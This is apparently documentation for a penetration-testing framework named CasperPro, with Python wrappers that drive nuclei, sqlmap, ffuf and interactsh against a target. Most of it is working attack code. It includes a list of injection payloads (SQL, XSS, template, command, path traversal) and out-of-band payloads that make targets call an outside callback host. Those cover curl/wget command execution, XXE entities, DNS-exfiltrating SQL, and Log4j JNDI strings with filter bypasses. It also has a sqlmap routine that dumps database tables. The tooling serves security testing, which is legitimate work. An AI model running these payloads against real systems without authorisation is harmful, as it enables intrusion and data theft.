# CasperPro Tools Integration Module

> Integration with nuclei, sqlmap, ffuf, interactsh, and other security tools

## Overview

This module provides seamless integration with best-in-class open-source security tools, combining their power with CasperPro's traffic interception and automation capabilities.

---

## 1. Nuclei Integration

### Nuclei Scanner Wrapper

```python
# nuclei_integration.py
import subprocess
import json
import os
from typing import Dict, List, Optional
from pathlib import Path

class NucleiScanner:
    """Integration with ProjectDiscovery Nuclei scanner"""
    
    def __init__(self, target: str, output_dir: str = "/tmp/casperpro"):
        self.target = target
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.findings = []
    
    def check_installed(self) -> bool:
        """Check if nuclei is installed"""
        result = subprocess.run(["which", "nuclei"], capture_output=True)
        return result.returncode == 0
    
    def update_templates(self):
        """Update nuclei templates"""
        print("[*] Updating nuclei templates...")
        subprocess.run(["nuclei", "-update-templates"], capture_output=True)
    
    def scan(self, templates: List[str] = None, severity: List[str] = None,
             rate_limit: int = 150, concurrency: int = 25,
             headers: Dict[str, str] = None) -> List[Dict]:
        """Run nuclei scan"""
        
        output_file = self.output_dir / "nuclei_results.json"
        
        cmd = [
            "nuclei",
            "-u", self.target,
            "-json",
            "-o", str(output_file),
            "-rate-limit", str(rate_limit),
            "-c", str(concurrency),
            "-silent"
        ]
        
        # Add template filters
        if templates:
            for t in templates:
                cmd.extend(["-t", t])
        
        if severity:
            cmd.extend(["-s", ",".join(severity)])
        
        # Add custom headers
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        print(f"[*] Running nuclei scan on {self.target}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Parse results
        if output_file.exists():
            with open(output_file) as f:
                for line in f:
                    try:
                        finding = json.loads(line.strip())
                        self.findings.append(self._normalize_finding(finding))
                    except:
                        pass
        
        print(f"[+] Nuclei found {len(self.findings)} issues")
        return self.findings
    
    def scan_cves(self, year: int = None) -> List[Dict]:
        """Scan for known CVEs"""
        templates = ["cves/"]
        if year:
            templates = [f"cves/{year}/"]
        
        return self.scan(templates=templates, severity=["critical", "high"])
    
    def scan_exposures(self) -> List[Dict]:
        """Scan for exposed panels and sensitive files"""
        return self.scan(
            templates=["exposures/", "exposed-panels/", "misconfiguration/"],
            severity=["critical", "high", "medium"]
        )
    
    def scan_vulnerabilities(self) -> List[Dict]:
        """Scan for web vulnerabilities"""
        return self.scan(
            templates=["vulnerabilities/"],
            severity=["critical", "high"]
        )
    
    def scan_technologies(self) -> List[Dict]:
        """Detect technologies and versions"""
        return self.scan(templates=["technologies/"])
    
    def scan_from_traffic(self, traffic_file: str) -> List[Dict]:
        """Scan URLs discovered from mitmproxy traffic"""
        # Load captured URLs
        with open(traffic_file) as f:
            traffic = json.load(f)
        
        urls = list(set(r.get("url") for r in traffic if r.get("url")))
        
        # Write URLs to file
        urls_file = self.output_dir / "urls.txt"
        with open(urls_file, "w") as f:
            f.write("\n".join(urls))
        
        # Run nuclei on URL list
        output_file = self.output_dir / "nuclei_traffic_results.json"
        
        cmd = [
            "nuclei",
            "-l", str(urls_file),
            "-json",
            "-o", str(output_file),
            "-silent"
        ]
        
        subprocess.run(cmd, capture_output=True)
        
        # Parse results
        findings = []
        if output_file.exists():
            with open(output_file) as f:
                for line in f:
                    try:
                        findings.append(json.loads(line.strip()))
                    except:
                        pass
        
        return findings
    
    def _normalize_finding(self, nuclei_finding: Dict) -> Dict:
        """Normalize nuclei finding to CasperPro format"""
        severity_map = {
            "critical": "CRITICAL",
            "high": "HIGH",
            "medium": "MEDIUM",
            "low": "LOW",
            "info": "INFO"
        }
        
        return {
            "type": nuclei_finding.get("info", {}).get("name", "Unknown"),
            "severity": severity_map.get(
                nuclei_finding.get("info", {}).get("severity", "info").lower(),
                "INFO"
            ),
            "url": nuclei_finding.get("matched-at", ""),
            "description": nuclei_finding.get("info", {}).get("description", ""),
            "evidence": nuclei_finding.get("extracted-results", []),
            "template": nuclei_finding.get("template-id", ""),
            "reference": nuclei_finding.get("info", {}).get("reference", []),
            "cve": nuclei_finding.get("info", {}).get("classification", {}).get("cve-id", [])
        }


# Quick scan function
def nuclei_quick_scan(target: str, token: str = None) -> List[Dict]:
    """Quick nuclei scan with common templates"""
    scanner = NucleiScanner(target)
    
    if not scanner.check_installed():
        print("[-] Nuclei not installed. Install with: brew install nuclei")
        return []
    
    # Run comprehensive scan
    all_findings = []
    
    # CVEs
    print("[*] Scanning for CVEs...")
    all_findings.extend(scanner.scan_cves())
    
    # Exposures
    print("[*] Scanning for exposures...")
    all_findings.extend(scanner.scan_exposures())
    
    # Vulnerabilities
    print("[*] Scanning for vulnerabilities...")
    all_findings.extend(scanner.scan_vulnerabilities())
    
    # Save combined results
    with open("/tmp/casperpro/nuclei_all_findings.json", "w") as f:
        json.dump(all_findings, f, indent=2)
    
    return all_findings
```

---

## 2. SQLMap Integration

### SQLMap Automation

```python
# sqlmap_integration.py
import subprocess
import json
import os
import tempfile
from typing import Dict, List, Optional
from pathlib import Path

class SQLMapScanner:
    """Integration with SQLMap for SQL injection testing"""
    
    def __init__(self, output_dir: str = "/tmp/casperpro"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.findings = []
    
    def check_installed(self) -> bool:
        """Check if sqlmap is installed"""
        result = subprocess.run(["which", "sqlmap"], capture_output=True)
        return result.returncode == 0
    
    def scan_url(self, url: str, params: str = None,
                 level: int = 1, risk: int = 1,
                 technique: str = "BEUSTQ",
                 headers: Dict[str, str] = None,
                 cookie: str = None,
                 batch: bool = True) -> Dict:
        """Scan URL for SQL injection"""
        
        output_file = self.output_dir / "sqlmap_output"
        
        cmd = [
            "sqlmap",
            "-u", url,
            "--level", str(level),
            "--risk", str(risk),
            "--technique", technique,
            "--output-dir", str(output_file),
            "--flush-session"
        ]
        
        if batch:
            cmd.append("--batch")
        
        if params:
            cmd.extend(["-p", params])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["--header", f"{k}: {v}"])
        
        if cookie:
            cmd.extend(["--cookie", cookie])
        
        print(f"[*] Running SQLMap on {url}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        # Parse output
        finding = self._parse_output(result.stdout, url)
        if finding:
            self.findings.append(finding)
        
        return finding
    
    def scan_request(self, request_file: str, 
                     level: int = 3, risk: int = 2) -> Dict:
        """Scan from captured HTTP request file"""
        
        cmd = [
            "sqlmap",
            "-r", request_file,
            "--level", str(level),
            "--risk", str(risk),
            "--batch",
            "--output-dir", str(self.output_dir / "sqlmap_request")
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return self._parse_output(result.stdout, request_file)
    
    def scan_from_mitmproxy(self, traffic_file: str) -> List[Dict]:
        """Scan requests captured by mitmproxy"""
        findings = []
        
        with open(traffic_file) as f:
            requests = json.load(f)
        
        # Find requests with parameters
        injectable_requests = []
        for req in requests:
            url = req.get("url", "")
            if "?" in url or req.get("body"):
                injectable_requests.append(req)
        
        print(f"[*] Found {len(injectable_requests)} potentially injectable requests")
        
        for req in injectable_requests[:10]:  # Limit for time
            # Create request file
            request_content = self._create_request_file(req)
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(request_content)
                request_file = f.name
            
            try:
                finding = self.scan_request(request_file, level=2, risk=1)
                if finding.get("vulnerable"):
                    findings.append(finding)
            finally:
                os.unlink(request_file)
        
        return findings
    
    def _create_request_file(self, request: Dict) -> str:
        """Create HTTP request file from captured request"""
        from urllib.parse import urlparse
        
        url = request.get("url", "")
        method = request.get("method", "GET")
        headers = request.get("headers", {})
        body = request.get("body", "")
        
        parsed = urlparse(url)
        
        lines = [
            f"{method} {parsed.path}{'?' + parsed.query if parsed.query else ''} HTTP/1.1",
            f"Host: {parsed.netloc}"
        ]
        
        for k, v in headers.items():
            if k.lower() not in ["host", "content-length"]:
                lines.append(f"{k}: {v}")
        
        if body:
            lines.append(f"Content-Length: {len(body)}")
            lines.append("")
            lines.append(body)
        
        return "\r\n".join(lines)
    
    def _parse_output(self, output: str, url: str) -> Dict:
        """Parse SQLMap output"""
        finding = {
            "url": url,
            "vulnerable": False,
            "injection_type": [],
            "dbms": None,
            "evidence": ""
        }
        
        # Check for vulnerability confirmation
        if "is vulnerable" in output.lower() or "sqlmap identified" in output.lower():
            finding["vulnerable"] = True
        
        # Extract injection types
        if "time-based blind" in output.lower():
            finding["injection_type"].append("Time-based blind")
        if "boolean-based blind" in output.lower():
            finding["injection_type"].append("Boolean-based blind")
        if "error-based" in output.lower():
            finding["injection_type"].append("Error-based")
        if "UNION query" in output:
            finding["injection_type"].append("UNION-based")
        if "stacked queries" in output.lower():
            finding["injection_type"].append("Stacked queries")
        
        # Extract DBMS
        dbms_patterns = ["MySQL", "PostgreSQL", "Microsoft SQL Server", 
                        "Oracle", "SQLite", "MariaDB"]
        for dbms in dbms_patterns:
            if dbms.lower() in output.lower():
                finding["dbms"] = dbms
                break
        
        finding["evidence"] = output[-2000:] if len(output) > 2000 else output
        
        return finding
    
    def dump_data(self, url: str, table: str = None, 
                  columns: List[str] = None) -> Dict:
        """Dump database data"""
        cmd = [
            "sqlmap",
            "-u", url,
            "--batch",
            "--dump"
        ]
        
        if table:
            cmd.extend(["-T", table])
        
        if columns:
            cmd.extend(["-C", ",".join(columns)])
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        
        return {
            "url": url,
            "table": table,
            "output": result.stdout
        }
```

---

## 3. FFUF Integration

### FFUF Fuzzer Wrapper

```python
# ffuf_integration.py
import subprocess
import json
from typing import Dict, List, Optional
from pathlib import Path

class FFUFScanner:
    """Integration with FFUF for content discovery and fuzzing"""
    
    def __init__(self, target: str, output_dir: str = "/tmp/casperpro"):
        self.target = target.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
    
    def check_installed(self) -> bool:
        """Check if ffuf is installed"""
        result = subprocess.run(["which", "ffuf"], capture_output=True)
        return result.returncode == 0
    
    def content_discovery(self, wordlist: str = None,
                          extensions: List[str] = None,
                          threads: int = 40,
                          rate: int = 0,
                          headers: Dict[str, str] = None,
                          filter_status: List[int] = None,
                          filter_size: List[int] = None) -> List[Dict]:
        """Discover hidden content/directories"""
        
        if not wordlist:
            # Use common wordlists
            wordlists = [
                "/usr/share/wordlists/dirb/common.txt",
                "/usr/share/seclists/Discovery/Web-Content/common.txt",
                "/opt/SecLists/Discovery/Web-Content/common.txt"
            ]
            for wl in wordlists:
                if Path(wl).exists():
                    wordlist = wl
                    break
        
        if not wordlist:
            print("[-] No wordlist found. Please specify one.")
            return []
        
        output_file = self.output_dir / "ffuf_content.json"
        
        cmd = [
            "ffuf",
            "-u", f"{self.target}/FUZZ",
            "-w", wordlist,
            "-t", str(threads),
            "-o", str(output_file),
            "-of", "json",
            "-s"  # Silent
        ]
        
        if extensions:
            cmd.extend(["-e", ",".join(f".{e}" for e in extensions)])
        
        if rate:
            cmd.extend(["-rate", str(rate)])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        if filter_status:
            cmd.extend(["-fc", ",".join(str(s) for s in filter_status)])
        else:
            cmd.extend(["-fc", "404"])  # Default filter 404s
        
        if filter_size:
            cmd.extend(["-fs", ",".join(str(s) for s in filter_size)])
        
        print(f"[*] Running FFUF content discovery on {self.target}")
        subprocess.run(cmd, capture_output=True)
        
        return self._parse_results(output_file)
    
    def vhost_discovery(self, wordlist: str = None,
                        domain: str = None) -> List[Dict]:
        """Discover virtual hosts"""
        
        if not domain:
            from urllib.parse import urlparse
            domain = urlparse(self.target).netloc
        
        if not wordlist:
            wordlists = [
                "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "/opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"
            ]
            for wl in wordlists:
                if Path(wl).exists():
                    wordlist = wl
                    break
        
        output_file = self.output_dir / "ffuf_vhost.json"
        
        cmd = [
            "ffuf",
            "-u", self.target,
            "-w", wordlist,
            "-H", f"Host: FUZZ.{domain}",
            "-o", str(output_file),
            "-of", "json",
            "-s"
        ]
        
        print(f"[*] Running FFUF vhost discovery on {domain}")
        subprocess.run(cmd, capture_output=True)
        
        return self._parse_results(output_file)
    
    def parameter_fuzzing(self, url: str, wordlist: str = None,
                         method: str = "GET") -> List[Dict]:
        """Fuzz for hidden parameters"""
        
        if not wordlist:
            wordlists = [
                "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
                "/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt"
            ]
            for wl in wordlists:
                if Path(wl).exists():
                    wordlist = wl
                    break
        
        output_file = self.output_dir / "ffuf_params.json"
        
        if method == "GET":
            fuzz_url = f"{url}?FUZZ=test"
        else:
            fuzz_url = url
        
        cmd = [
            "ffuf",
            "-u", fuzz_url,
            "-w", wordlist,
            "-o", str(output_file),
            "-of", "json",
            "-s"
        ]
        
        if method == "POST":
            cmd.extend(["-X", "POST", "-d", "FUZZ=test"])
        
        print(f"[*] Running FFUF parameter fuzzing on {url}")
        subprocess.run(cmd, capture_output=True)
        
        return self._parse_results(output_file)
    
    def injection_fuzzing(self, url: str, param: str,
                          payloads: str = None) -> List[Dict]:
        """Fuzz parameter with injection payloads"""
        
        if not payloads:
            # Create injection payloads
            payloads_file = self.output_dir / "injection_payloads.txt"
            injection_payloads = [
                "'", "\"", "\\", "1' OR '1'='1", "1 OR 1=1",
                "<script>alert(1)</script>", "{{7*7}}", "${7*7}",
                "; id", "| id", "$(id)", "`id`",
                "../../../etc/passwd", "....//....//etc/passwd"
            ]
            with open(payloads_file, "w") as f:
                f.write("\n".join(injection_payloads))
            payloads = str(payloads_file)
        
        output_file = self.output_dir / "ffuf_injection.json"
        
        # Replace param value with FUZZ
        if "?" in url:
            fuzz_url = url.replace(f"{param}=", f"{param}=FUZZ")
        else:
            fuzz_url = f"{url}?{param}=FUZZ"
        
        cmd = [
            "ffuf",
            "-u", fuzz_url,
            "-w", payloads,
            "-o", str(output_file),
            "-of", "json",
            "-mc", "all",  # Match all status codes
            "-s"
        ]
        
        print(f"[*] Running FFUF injection fuzzing on {url}")
        subprocess.run(cmd, capture_output=True)
        
        return self._parse_results(output_file)
    
    def _parse_results(self, output_file: Path) -> List[Dict]:
        """Parse FFUF JSON output"""
        if not output_file.exists():
            return []
        
        try:
            with open(output_file) as f:
                data = json.load(f)
            
            results = []
            for result in data.get("results", []):
                results.append({
                    "input": result.get("input", {}).get("FUZZ", ""),
                    "url": result.get("url", ""),
                    "status": result.get("status", 0),
                    "length": result.get("length", 0),
                    "words": result.get("words", 0),
                    "lines": result.get("lines", 0)
                })
            
            return results
        except:
            return []
```

---

## 4. Interactsh Integration

### Out-of-Band Testing

```python
# interactsh_integration.py
import subprocess
import json
import time
import re
from typing import Dict, List, Optional
from pathlib import Path

class InteractshClient:
    """Integration with ProjectDiscovery Interactsh for OOB testing"""
    
    def __init__(self, output_dir: str = "/tmp/casperpro"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.server = None
        self.token = None
        self.session_file = self.output_dir / "interactsh_session.json"
        self.interactions = []
    
    def check_installed(self) -> bool:
        """Check if interactsh-client is installed"""
        result = subprocess.run(["which", "interactsh-client"], capture_output=True)
        return result.returncode == 0
    
    def start_session(self) -> str:
        """Start interactsh session and get URL"""
        print("[*] Starting Interactsh session...")
        
        # Run interactsh-client to get URL
        cmd = [
            "interactsh-client",
            "-json",
            "-o", str(self.output_dir / "interactsh_output.json"),
            "-n", "1"  # Just get the URL
        ]
        
        # Run briefly to get URL
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Wait for URL
        time.sleep(3)
        
        # Read output to get URL
        stdout = proc.stdout.read()
        
        # Extract URL pattern
        url_match = re.search(r'([a-z0-9]+\.oast\.(fun|me|pro|live))', stdout)
        if url_match:
            self.server = url_match.group(1)
            print(f"[+] Interactsh URL: {self.server}")
        
        proc.terminate()
        
        return self.server
    
    def get_payload_url(self, identifier: str = "") -> str:
        """Generate unique payload URL"""
        if not self.server:
            self.start_session()
        
        if identifier:
            return f"{identifier}.{self.server}"
        return self.server
    
    def generate_payloads(self, vuln_type: str) -> Dict[str, str]:
        """Generate OOB payloads for different vulnerability types"""
        base_url = self.get_payload_url()
        
        payloads = {
            "ssrf": {
                "http": f"http://{base_url}",
                "https": f"https://{base_url}",
                "dns": base_url
            },
            "xxe": {
                "basic": f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{base_url}">]>',
                "param": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{base_url}"> %xxe;]>',
                "oob": f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{base_url}/data.dtd"> %xxe;]>'
            },
            "rce": {
                "curl": f"curl http://{base_url}",
                "wget": f"wget http://{base_url}",
                "nslookup": f"nslookup {base_url}",
                "ping": f"ping -c 1 {base_url}"
            },
            "sqli": {
                "dns_exfil": f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.{base_url}\\\\a')); --",
                "oob": f"1; EXEC xp_dirtree '//{base_url}/a'; --"
            },
            "ssti": {
                "jinja2": f"{{{{ ''.__class__.__mro__[2].__subclasses__()[40]('curl http://{base_url}', shell=True) }}}}",
            },
            "log4j": {
                "basic": f"${{jndi:ldap://{base_url}/a}}",
                "bypass1": f"${{${{lower:j}}ndi:ldap://{base_url}/a}}",
                "bypass2": f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{base_url}/a}}"
            }
        }
        
        return payloads.get(vuln_type, {})
    
    def check_interactions(self, timeout: int = 30) -> List[Dict]:
        """Check for OOB interactions"""
        print(f"[*] Waiting {timeout}s for interactions...")
        
        output_file = self.output_dir / "interactsh_output.json"
        
        cmd = [
            "interactsh-client",
            "-json",
            "-o", str(output_file),
            "-poll-interval", "5"
        ]
        
        if self.server:
            cmd.extend(["-s", self.server])
        
        # Run with timeout
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(timeout)
            proc.terminate()
        except:
            pass
        
        # Parse interactions
        interactions = []
        if output_file.exists():
            with open(output_file) as f:
                for line in f:
                    try:
                        interaction = json.loads(line.strip())
                        interactions.append({
                            "protocol": interaction.get("protocol", ""),
                            "full_id": interaction.get("full-id", ""),
                            "remote_address": interaction.get("remote-address", ""),
                            "timestamp": interaction.get("timestamp", ""),
                            "raw_request": interaction.get("raw-request", "")
                        })
                    except:
                        pass
        
        self.interactions = interactions
        return interactions
    
    def test_blind_ssrf(self, target_url: str, param: str,
                        token: str = None) -> Dict:
        """Test for blind SSRF using OOB"""
        payload_url = self.get_payload_url("ssrf-test")
        
        # Inject payload
        import subprocess
        
        test_url = f"{target_url}?{param}={payload_url}"
        
        cmd = ["curl", "-s", "-o", "/dev/null", test_url]
        if token:
            cmd.extend(["-H", f"Authorization: Bearer {token}"])
        
        subprocess.run(cmd, capture_output=True)
        
        # Check for interaction
        time.sleep(5)
        interactions = self.check_interactions(timeout=10)
        
        if interactions:
            return {
                "vulnerable": True,
                "type": "Blind SSRF",
                "url": target_url,
                "param": param,
                "interactions": interactions
            }
        
        return {"vulnerable": False}
    
    def test_blind_xxe(self, target_url: str, 
                       token: str = None) -> Dict:
        """Test for blind XXE using OOB"""
        payloads = self.generate_payloads("xxe")
        
        for name, payload in payloads.items():
            xml_payload = f'''<?xml version="1.0"?>
{payload}
<root>&xxe;</root>'''
            
            cmd = [
                "curl", "-s", "-X", "POST",
                "-H", "Content-Type: application/xml",
                "-d", xml_payload,
                target_url
            ]
            
            if token:
                cmd.extend(["-H", f"Authorization: Bearer {token}"])
            
            subprocess.run(cmd, capture_output=True)
        
        time.sleep(5)
        interactions = self.check_interactions(timeout=10)
        
        if interactions:
            return {
                "vulnerable": True,
                "type": "Blind XXE",
                "url": target_url,
                "interactions": interactions
            }
        
        return {"vulnerable": False}
    
    def test_log4j(self, target_url: str,
                   token: str = None) -> Dict:
        """Test for Log4j vulnerability using OOB"""
        payloads = self.generate_payloads("log4j")
        
        # Inject in various headers
        headers_to_test = [
            "User-Agent", "X-Forwarded-For", "Referer",
            "X-Api-Version", "Accept-Language"
        ]
        
        for header in headers_to_test:
            for name, payload in payloads.items():
                cmd = [
                    "curl", "-s", "-o", "/dev/null",
                    "-H", f"{header}: {payload}",
                    target_url
                ]
                
                if token:
                    cmd.extend(["-H", f"Authorization: Bearer {token}"])
                
                subprocess.run(cmd, capture_output=True)
        
        time.sleep(10)
        interactions = self.check_interactions(timeout=15)
        
        if interactions:
            return {
                "vulnerable": True,
                "type": "Log4j RCE (CVE-2021-44228)",
                "severity": "CRITICAL",
                "url": target_url,
                "interactions": interactions
            }
        
        return {"vulnerable": False}
```

---

## 5. Integrated Tool Runner

### Combined Security Scanner

```python
# integrated_scanner.py
"""
Run all integrated security tools
"""

import json
import sys
from pathlib import Path
from typing import Dict, List

def run_integrated_scan(target: str, token: str = None,
                       tools: List[str] = None) -> Dict:
    """Run integrated security scan with all tools"""
    
    if tools is None:
        tools = ["nuclei", "ffuf", "interactsh"]
    
    all_findings = []
    results = {}
    
    # Nuclei scan
    if "nuclei" in tools:
        print("\n" + "="*60)
        print("NUCLEI VULNERABILITY SCANNING")
        print("="*60)
        
        try:
            from nuclei_integration import nuclei_quick_scan
            findings = nuclei_quick_scan(target, token)
            all_findings.extend(findings)
            results["nuclei"] = {
                "status": "completed",
                "findings": len(findings)
            }
        except Exception as e:
            results["nuclei"] = {"status": "error", "error": str(e)}
    
    # FFUF content discovery
    if "ffuf" in tools:
        print("\n" + "="*60)
        print("FFUF CONTENT DISCOVERY")
        print("="*60)
        
        try:
            from ffuf_integration import FFUFScanner
            scanner = FFUFScanner(target)
            
            if scanner.check_installed():
                content = scanner.content_discovery()
                
                # Convert to findings
                for item in content:
                    if item["status"] not in [404, 403]:
                        all_findings.append({
                            "type": "Content Discovery",
                            "severity": "INFO",
                            "url": item["url"],
                            "description": f"Hidden content found: {item['input']}"
                        })
                
                results["ffuf"] = {
                    "status": "completed",
                    "findings": len(content)
                }
            else:
                results["ffuf"] = {"status": "not_installed"}
        except Exception as e:
            results["ffuf"] = {"status": "error", "error": str(e)}
    
    # Interactsh OOB testing
    if "interactsh" in tools:
        print("\n" + "="*60)
        print("INTERACTSH OOB TESTING")
        print("="*60)
        
        try:
            from interactsh_integration import InteractshClient
            client = InteractshClient()
            
            if client.check_installed():
                # Test Log4j
                log4j = client.test_log4j(target, token)
                if log4j.get("vulnerable"):
                    all_findings.append(log4j)
                
                results["interactsh"] = {
                    "status": "completed",
                    "interactions": len(client.interactions)
                }
            else:
                results["interactsh"] = {"status": "not_installed"}
        except Exception as e:
            results["interactsh"] = {"status": "error", "error": str(e)}
    
    # SQLMap for discovered endpoints
    if "sqlmap" in tools:
        print("\n" + "="*60)
        print("SQLMAP INJECTION TESTING")
        print("="*60)
        
        try:
            from sqlmap_integration import SQLMapScanner
            scanner = SQLMapScanner()
            
            if scanner.check_installed():
                # Would scan injectable endpoints
                results["sqlmap"] = {"status": "completed"}
            else:
                results["sqlmap"] = {"status": "not_installed"}
        except Exception as e:
            results["sqlmap"] = {"status": "error", "error": str(e)}
    
    # Save all findings
    output_file = Path("/tmp/casperpro/integrated_scan_findings.json")
    with open(output_file, "w") as f:
        json.dump({
            "target": target,
            "tools": results,
            "total_findings": len(all_findings),
            "findings": all_findings
        }, f, indent=2)
    
    print(f"\n[+] Integrated scan complete")
    print(f"    Total findings: {len(all_findings)}")
    print(f"    Results saved to: {output_file}")
    
    return {
        "tools": results,
        "findings": all_findings
    }

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    run_integrated_scan(target, token)
```

---

## Tool Installation

```bash
# Install all required tools

# Nuclei
brew install nuclei
# or
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# FFUF
brew install ffuf
# or
go install github.com/ffuf/ffuf/v2@latest

# SQLMap
brew install sqlmap
# or clone and run with uv
git clone https://github.com/sqlmapproject/sqlmap.git ~/tools/sqlmap
alias sqlmap="uv run ~/tools/sqlmap/sqlmap.py"

# Interactsh
brew install interactsh
# or
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Wordlists
git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists
```

---

## Summary

| Tool | Purpose | Integration |
|------|---------|-------------|
| **Nuclei** | Template-based vuln scanning | Auto-scan CVEs, exposures |
| **FFUF** | Content discovery, fuzzing | Directory/vhost/param discovery |
| **SQLMap** | SQL injection | Auto-detect and exploit SQLi |
| **Interactsh** | OOB testing | SSRF, XXE, Log4j detection |

---

**This module provides seamless integration with industry-standard security tools, combining their power with CasperPro's traffic interception capabilities.**
